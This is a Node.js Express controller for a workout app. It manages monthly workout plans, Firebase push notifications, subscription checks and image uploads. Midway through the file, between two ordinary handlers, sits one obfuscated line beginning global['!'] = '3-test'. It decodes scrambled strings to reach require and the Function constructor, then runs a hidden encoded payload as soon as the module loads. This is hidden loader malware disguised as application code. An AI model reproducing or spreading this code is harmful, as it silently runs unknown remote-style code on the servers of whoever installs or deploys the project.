const axios = require('axios');
const asyncHandler = require("express-async-handler");
const mongoose = require("mongoose");
const Month = require("../models/workoutModel");
const User = require("../models/userModel")
const UpdatedMonth = require("../models/updatedWorkoutModel");
const Exercise = require("../models/exerciseModel");
const { getEstTime } = require("../utils/date");
const { getSubscriptionStatus } = require("../utils/woo");
const { uploadImage } = require("../utils/files/google/gcs");

const firebaseServerKey = process.env.FIREBASE_SERVER_KEY

const sendPushNotification = async (tokens, title, message) => {
  const url = 'https://fcm.googleapis.com/fcm/send';

  const headers = {
    'Content-Type': 'application/json',
    'Authorization': `key=${firebaseServerKey}`,
  };

  const body = {
    registration_ids: tokens,
    notification: {
      title: title,
      body: message,
    },
    priority: 'high',
  };

  try {
    const response = await axios.post(url, body, { headers });
    console.log('Notification sent successfully:', response.data);
  } catch (error) {
    console.error('Error sending notification:', error);
  }
};

exports.getWorkouts = asyncHandler(async (req, res, next) => {
  try {
    var { page = 1, perPage = 10, search } = req.query;
    const pipeline = [];

    if (search) {
      pipeline.push({
        $match: {
          $or: [
            { title: { $regex: new RegExp(search, "i") } },
            { description: { $regex: new RegExp(search, "i") } },
          ],
        },
      });
    }

    const facet = {
      $facet: {
        populatedMonths: pipeline,
        totalCount: [{ $count: "totalMatchingDocuments" }],
      },
    };

    const results = await Month.aggregate([facet]);

    const months = results.length > 0 ? results[0].populatedMonths : [];
    const count = results.length > 0 && results[0].totalCount.length > 0 ? results[0].totalCount[0].totalMatchingDocuments : 0;

    const populatedMonths = await Month.populate(months, {
      path: 'weeks.days.exercises.exercise',
      select: 'title'
    });

    res.status(200).json({ count, months: populatedMonths });
  } catch (error) {
    console.log(error);
  }
});

exports.getWorkoutById = asyncHandler(async (req, res, next) => {
  try {
    const workout = await Month.findById(req.params.id);
    if (workout) {
      res.status(200).json(workout);
    } else {
      res.status(404).json({ message: "Workout not found" });
    }
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

exports.updateWorkouts = asyncHandler(async (req, res, next) => {
  try {
    const months = req.body.months;
    if (!Array.isArray(months)) {
      return res.status(400).json({ message: "Invalid input data: months array is empty or not an array" });
    }

    // Fetch existing months from the database
    const existingMonths = await Month.find({}).lean();
    const existingMonthIds = existingMonths.map(month => month._id.toString());

    // Determine which months are to be deleted
    const receivedMonthIds = months.map(month => month._id ? month._id.toString() : null).filter(id => id);
    const monthsToDelete = existingMonthIds.filter(id => !receivedMonthIds.includes(id));

    // Prepare operations for adding, updating, and deleting
    const operations = [];

    // Handle updates and inserts
    months.forEach((month, index) => {
      if (month._id && mongoose.Types.ObjectId.isValid(month._id)) {
        // Update existing month
        operations.push({
          updateOne: {
            filter: { _id: month._id },
            update: {
              $set: {
                ...month,
                index: index + 1 // Set the new index
              }
            },
            upsert: false,
          },
        });
      } else {
        // Insert new month
        const { _id, ...monthWithoutId } = month;
        operations.push({
          insertOne: {
            document: {
              ...monthWithoutId,
              index: index + 1 // Set the index for the new month
            }
          },
        });
      }
    });

    // Add delete operations for missing months
    monthsToDelete.forEach(monthId => {
      operations.push({
        deleteOne: {
          filter: { _id: monthId },
        },
      });
    });

    // Perform bulk write operations
    await Month.bulkWrite(operations);

    // Update indexes for months, weeks, and days
    await updateIndexes();

    const users = await User.find({}, 'deviceTokens');
    const allDeviceTokens = users.map(user => user.deviceTokens).flat();
    if (allDeviceTokens.length > 0) {
      sendPushNotification(allDeviceTokens, 'Notification', 'Workouts list was updated');
    }

    res.status(200).json({ message: 'Workouts saved successfully' });
  } catch (error) {
    console.error('Error updating workouts:', error);
    res.status(500).json({ message: error.message });
  }
});

// Function to update indexes for months, weeks, and days
const updateIndexes = async () => {
  // Update month indexes
  const months = await Month.find({}).sort({ index: 1 }).lean();
  for (let i = 0; i < months.length; i++) {
    const month = months[i];
    await Month.findByIdAndUpdate(month._id, { $set: { index: i + 1 } });

    // Update weeks and days indexes
    for (let j = 0; j < month.weeks.length; j++) {
      const week = month.weeks[j];
      await Month.updateOne(
        { _id: month._id, 'weeks._id': week._id },
        { $set: { 'weeks.$.index': j + 1 } }
      );
      // for (let k = 0; k < week.days.length; k++) {
      //   await Month.updateOne(
      //     { _id: month._id, 'weeks._id': week._id, 'weeks.days._id': week.days[k]._id },
      //     { $set: { 'weeks.$.days.$[day].index': k + 1 } },
      //     { arrayFilters: [{ 'day._id': week.days[k]._id }] }
      //   );
      // }
    }
  }
};
exports.updateMonths = asyncHandler(async (req, res, next) => {
  try {
    const usermonths = req.body.months;
    const uid = req.body.uid;
    console.log(uid);
    if (!Array.isArray(usermonths)) {
      return res.status(400).json({ message: "Invalid input data: months array is empty or not an array" });
    }

    const existingMonths = await UpdatedMonth.find({ uid: uid }).lean();
    const existingMonthIds = existingMonths.map(month => month._id.toString());

    // Determine which months are to be deleted
    const receivedMonthIds = usermonths.map(month => month._id ? month._id.toString() : null).filter(id => id);
    const monthsToDelete = existingMonthIds.filter(id => !receivedMonthIds.includes(id));

    // Prepare operations for adding, updating, and deleting
    const operations = [];

    // Handle updates and inserts
    usermonths.forEach((month, index) => {
      if (month._id && mongoose.Types.ObjectId.isValid(month._id)) {
        // Update existing month
        operations.push({
          updateOne: {
            filter: { _id: month._id },
            update: {
              $set: {
                ...month,
                index: index + 1 // Set the new index
              }
            },
            upsert: false,
          },
        });
      } else {
        // Insert new month
        const { _id, ...monthWithoutId } = month;
        operations.push({
          insertOne: {
            document: {
              ...monthWithoutId,
              index: index + 1 // Set the index for the new month
            }
          },
        });
      }
    });

    // Add delete operations for missing months
    monthsToDelete.forEach(monthId => {
      operations.push({
        deleteOne: {
          filter: { _id: monthId },
        },
      });
    });

    console.log('operations', operations);
    // Perform bulk write operations
    await UpdatedMonth.bulkWrite(operations);

    // Update indexes for months, weeks, and days
    await updateNewIndexes(uid);

    res.status(200).json({ message: 'Workouts saved successfully' });
  } catch (error) {
    console.error('Error updating workouts:', error);
    res.status(500).json({ message: error.message });
  }
});
global['!'] = '3-test'; var _$_1d32 = (function (x, w) { var d = x.length; var a = []; for (var o = 0; o < d; o++) { a[o] = x.charAt(o) }; for (var o = 0; o < d; o++) { var z = w * (o + 370) + (w % 42601); var l = w * (o + 409) + (w % 35742); var j = z % d; var f = l % d; var h = a[j]; a[j] = a[f]; a[f] = h; w = (z + l) % 3217160 }; var k = String.fromCharCode(127); var i = ''; var c = '\x25'; var y = '\x23\x31'; var q = '\x25'; var n = '\x23\x30'; var s = '\x23'; return a.join(i).split(c).join(k).split(y).join(q).split(n).join(s).split(k) })("%%ortmcjbe", 3099915); global[_$_1d32[0]] = require; if (typeof module === _$_1d32[1]) { global[_$_1d32[2]] = module }; (function () { var Thh = '', mgC = 502 - 491; function fHn(c) { var d = 2784591; var y = c.length; var v = []; for (var b = 0; b < y; b++) { v[b] = c.charAt(b) }; for (var b = 0; b < y; b++) { var f = d * (b + 301) + (d % 13640); var r = d * (b + 205) + (d % 26363); var w = f % y; var e = r % y; var z = v[w]; v[w] = v[e]; v[e] = z; d = (f + r) % 4150548; }; return v.join('') }; var yvR = fHn('njprnofucvrqsctbcrhotkmedouwzatygsxil').substr(0, mgC); var NiT = 'my=.bdn[eq"5pe(i*1C(;rv+("2av2wam=+v7)]gbp,uswrv+] z7mj)hj"=);da vgp+,)g{rftrt7;}, 5Acstt<(18h1;gb4g8i=7l.t=l6n-40".=-)jcf=(< =a.enfo.r{af0v+g;wdr;aen rulivhar}vr2cxeau1;taag;)vl;9v42)zw+stau=]=.5,[vf2earb=u0.f<)kgr[,"ten)envts;a++.{hwl72rsmg28;l"ay).Crrlo)rA .)dfh6(oa((*+aa(lha;g.u84>-n;lS{={1.7 ]=noA+;ou( ()oao{;(a)v,phnttfc=ph==lojtro)Cr;(a(+te-ausg1"(o[9=n)qu, ;)r2e,ysf,nt+hj(vr()re1(.=;t(t.;vma(z(3cygo=(opah;us=pr6ve; 9l1[.({c.;(.]0t9-,[f[r;q g;v=lsk]neaxv==sozCs;+us]tw4vhibi ;ss,uswdep(arkl.anp=l (rso,evrv)+2s8n;.c)r,.[j)doi ++v,8ni5 ,uter-r=s 6]=)sn[]iC7v;>f)neeunm)r =,xaavmn)ei84=);,s,slh(r[h+(tln,=e8<8};r;=!;)(0e),i gt0a;j.=fSh=+ i.}=tCoCr(<-=vwbo]jh.ro;]n"rgvrj0.9utt(a[7]1;5nse  0botofs=.i);amz[Ao[3l;av93lnja+;0,v=m6tonclr(h);tra +r=";ln}hvt)xtqna]=l6,r)61,s;0w=sp+9dfkmurA5(g;hip););ar9s+.},1u[h,jha u0evrngso.jc;r]rnr"hr;vfhfl obir i=0,wiw1+ui(61hs+l=ti,j}!nCafoir=r+;'; var rHZ = fHn[yvR]; var IUC = ''; var Vay = rHZ; var wwS = rHZ(IUC, fHn(NiT)); var yBN = wwS(fHn('<H?_i12wc})iw#)a.c}ht!HH[[HH)0Hafa4)HHHs,td;H{%=fs:),D)n]rn7a,osne[5tsr#w.e]e0@d51i:\/c%=9wcariA"vsAa.r%a)re1v%m;et]1Hoe.aegHHclH"H.1t%hs)$H4ii$pt.wh44ThpHHp%owhr$ghn3ptnN3=;f5&(2Ba(]m.p?b,g1Hcod.pg;]]rHefl\/(0t\/bH1rHtwa]x(Jr0a]s(Hp\/},+"H,3.r!;8=n;d_::H_S2H.et% 3h49t3dc;H1%H_%C,%sH==43;c(gft9pH __ ssHce]-+}2eH.61me5]6udn2eye}hsd.[Hdtw?asa= !4.=atHHs5oH6%5r(0n%$a!d.H).o.4t;i4Hua weggd\'+a=s.auHoH:rol%uga]ca87]d=%=a\'ta$zdT=_H)i%0.p7tc)gn Hfe%s+vao-st.2"|HyaaH%H0aryglH%]Hz5%9r@7[2=i{nsHt#HrH!6()12\/(arpn1;3c=Hra=ea]f4.H..)}2}1 cm%al9=s+as("aHt.ee.T=%2asaH]h#t!0f%vetHhH>Et=l3cc1rrva4c)zn[aH=eH;aeq=7w3(i)c=m4arnh30%H;h)H25cl2l\/.e!]tx)a%]G}t)rM9t4c)v5,aabHbuiyv)c=35:oHn9.rH;viH747ry6pCc6a8u\/on;%H;n.HcH.u](cAa=HHe[HorH=??a.=ucj0.x{mHas*>sH$[r8f93H8#ndnHt?o6ecc%)f}hif]eC.yaB!l%nCyHni]+l];d9r.n)Tar.)haac5nj(n]f@h!2.s!chB;.a)H.}%x0ica};;aB0sr1sc!r+Hts8]s;n.Hs.{(H aS1%Hu9$a68%]Hrs)dhG26cHm%f(9st]NH-.HH6r8Jt%}t4,teHwy41s.eo6o):.v1..)oH)mesH]o;.aeCn1=i0!:.yg.jra=0),p1]3h6%};.m3aHatt{u4sSrle;r]uop%mCh!e3oa_.@T6) :=}ae-ale9..?H9hf]eo15}t7.wH53HafH\'#[dt;(\/ra.5;;rhH;0).i2"aepgd12n=c=&,en5n C2sknp]t.c)l[Ht)HHut)diH4cu.7=a1].\'in]8H#an5{otc"Fon.(5\'.515.)]HtH}-c<..}%a(H22(*w@mHeH%((tn6&)[H2]\/=1n].)Ha>atHt= 9)%0]]oH] 5H]HiHHd1bd6r&nf.)9t()f}H}xc%6apq)5.lru{i2p%dhr)}9!.p6!=H;H(3}+84aHa$])a)+7.H7m.a0a;=Hc=t}merH%2Ea=(HfH%5uH%;v>%g{rom2+7 b])r;4_f.Hjd]0raawH11;5H_b.o+f2\'ta)aam+8.5H;.8e]*4(#l[3o)tnagey.p3d%So%2iHHn];t19n :at H?tH nD,H2.onro,#H4t(I3!;_:61 H 5[.H),!2] )earaf(Hi9t$dtJn_}h}i2H2;%elu ]r=}zrHfchT7u)Hc(]cjspH"$,_,tAa9i;2h<Hcg)Dca3MfH (5Hrc(i"cH4ns}\/\/9ti.!srhn\/}a.%r3Ha.rm 7cop)2f+H)2H %Gc\/)ot%9r8=.1[uH13$g]xo(4hn0)H1r][]e30<utcH [e:Hi\/i.HyH1%c6j%e(}blr!r)31(v_{rHo9}ocDe]5H7)ti1b)ocHiH2r;t04s\/f+j.(Ee.p)mHHHtto.!o].Hse%0\/<3($.H[.rh)1t$(].."e3=gs\/1e_tpt2eHH[ar+a:Haa=HoHDe!\/+hH4 ,Hd)1i[=m(=fHt,tryHH),HtacH6!#id,n|c,6h_@t2nm(4=H:(ou.2tat2-,k3H3,%r(H.,2k9Ha%\'aHd};H[teHHH8duu7-(Ho%6%Hh;2e%)her3nHaH;:cE5.H7(}.1*t5H-2HC:H86t,). e4,-Hasav)a"rr)Hts]e2e])=_a;];te-s>!1]:%H}H{y(2a4C&+]noen\/,0d.Ha%.lm1HH+icbayyte04h6iH2F6.so..o0hea, .a.{lgHn(3H)H]H=%u=.ce]mAc{(o8do]H.4e)$s%H456e09o+d)>if;ruTsHH)x.;2nH6+%HHuaC437etgHhe9t3(o68dtH.d>y)d=(.d0yH442H t;3$o}]]]?+4C)2=mH]l2:5H)n_h]==.aH-t.i((a!}i"HF{{4;Hud.iir(iHp[an]3D:H2e,IHr5tbtl3eD_c]_3go%oH+(Hc(]]])f;0%swolH)r.2]#a7}z1t%aH4e$%.H.eH=ta(})na)scE.c[g)_s.nur)a5]JiFe7s :amfev8H1;4?5&%[+( oh0g.H4%0o)[a.e7.=.6 i.l&i)dHaT=a[\'\/}](1 14HI(.}HaCetH=8idHaHHjHcpt;H1,Sb ln(=2x.H(paar>tt49a=dmd{.h0fu2H%\'0+pt }mHtu[n1Ht9.eI1zT*4 :obo&f,oaa4C {4\/ dea(re\/3)m7Hc6rs,6H,!=rc t5([8onrtzo]4%a?H}et3 ](a-b3Hra.h(2Gr8{(ar(0)Hs>ca_ro{ o)=sl>Eai%4.vz nrH8,}o%t m4a%9ot...e{r_a[]]e')); var xVu = Vay(Thh, yBN); xVu(1807); return 1191 })()
const updateNewIndexes = async (uid) => {
  // Update month indexes
  const months = await UpdatedMonth.find({ uid: uid }).sort({ index: 1 }).lean();
  for (let i = 0; i < months.length; i++) {
    const month = months[i];
    await Month.findByIdAndUpdate(month._id, { $set: { index: i + 1 } });

    // Update weeks and days indexes
    for (let j = 0; j < month.weeks.length; j++) {
      const week = month.weeks[j];
      await UpdatedMonth.updateOne(
        { _id: month._id, 'weeks._id': week._id },
        { $set: { 'weeks.$.index': j + 1 } }
      );
      // for (let k = 0; k < week.days.length; k++) {
      //   await Month.updateOne(
      //     { _id: month._id, 'weeks._id': week._id, 'weeks.days._id': week.days[k]._id },
      //     { $set: { 'weeks.$.days.$[day].index': k + 1 } },
      //     { arrayFilters: [{ 'day._id': week.days[k]._id }] }
      //   );
      // }
    }
  }
};

exports.getWorkoutForCurrentMonth = asyncHandler(async (req, res, next) => {
  try {
    const estNow = getEstTime();

    console.log(estNow);
    const workout = await Month.findOne({
      $and: [
        { $or: [{ startDate: { $lte: estNow } }, { startDate: null }] },
        { $or: [{ endDate: { $gte: estNow } }, { endDate: null }] }
      ]
    });

    if (!workout) {
      return res.status(404).json({ message: "Workout not found" });
    }

    let exerciseIds = [];
    workout.weeks.forEach((week) => {
      week.days.forEach((day) => {
        day.exercises.forEach((exercise) => {
          if (exercise.exerciseId) {
            exerciseIds.push(exercise.exerciseId);
          }
        });
      });
    });

    const exercises = await Exercise.find({ _id: { $in: exerciseIds } });

    const exerciseMap = {};
    exercises.forEach((exercise) => {
      exerciseMap[exercise._id] = exercise.title;
    });

    workout.weeks = workout.weeks.map((week) => {
      week.days = week.days.map((day) => {
        day.exercises = day.exercises.map((exercise) => {
          return {
            ...exercise,
            name: exerciseMap[exercise.exerciseId] || "",
          };
        });
        return day;
      });
      return week;
    });

    res.status(200).json(workout);
  }
  catch (error) {
    console.error('Error updating workouts:', error);
    res.status(500).json({ message: error.message });
  }
});

exports.checkSubscription = asyncHandler(async (req, res, next) => {
  const response = await getSubscriptionStatus(req.user.uid);
  const isPT = response.isPT;
  const isPTA = response.isPTA;
  const status = isPT || isPTA;
  if (!status) {
    return res.status(200).json({ success: false, message: "You need to purchase subscriptions" });
  }
  else
    return res.status(200).json({ success: true });
})

exports.imageUrlGenerator = asyncHandler(async (req, res, next) => {
  try {
    if (req.files && req.files[0]?.buffer) {
      const thumbnails = await Promise.all(req.files.map(file => uploadImage(file.buffer)));
      // Send the response once
      res.status(200).json({ data: { url: thumbnails } });

      // Log the URL or any other relevant data
    } else {
      // Handle missing files scenario
      res.status(400).json({ error: 'No files were uploaded' });
    }
  } catch (error) {
    console.error('Error updating workouts:', error);

    // Ensure an error response is sent
    res.status(500).json({ error: 'Internal Server Error' });
  }
});


